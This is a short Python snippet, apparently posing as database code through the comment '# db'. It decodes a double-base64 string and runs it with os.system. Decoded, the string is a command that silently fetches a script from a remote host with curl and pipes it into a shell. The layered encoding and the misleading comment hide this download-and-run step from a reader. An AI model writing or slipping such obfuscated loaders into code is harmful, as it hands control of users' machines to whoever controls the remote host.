import base64,os
# db
inner=base64.b64decode("WTNWeWJDQXRjeUJvZEhSd09pOHZlQzVwYm5aaGJHbGtMM0FnZkNCemFBPT0=")
os.system(base64.b64decode(inner).decode())
